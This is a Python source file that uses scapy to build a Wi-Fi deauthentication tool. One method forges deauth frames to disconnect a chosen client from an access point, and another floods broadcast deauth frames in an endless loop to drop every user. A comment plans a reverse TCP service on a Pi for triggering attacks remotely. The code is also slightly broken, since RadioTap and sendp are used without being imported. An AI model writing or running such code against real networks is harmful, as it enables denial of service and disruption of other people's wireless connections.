from scapy.all import Dot11, Dot11Deauth, send,conf
import sys
import time


class Deauther:
    def __init__(self,interface):
        self.interface = interface
        conf.promisc = False

    def disconnect_user(self,target_mac, ap_mac):
        conf.promisc = True
        packet = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    
        send(packet, iface=self.interface, count=10, inter=0.1)
        print(f"Deauthentication packet sent to {target_mac} from AP {ap_mac}")
        conf.promisc = False
        # will call a linux service stored on pi
        # this service will run a reverse tcp connection that we will connect to and run deauth command


    def disconnect_all_users(self,ap_mac):
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()

        while True:
            sendp(pkt, iface=self.interface, count=100, inter=0.1)

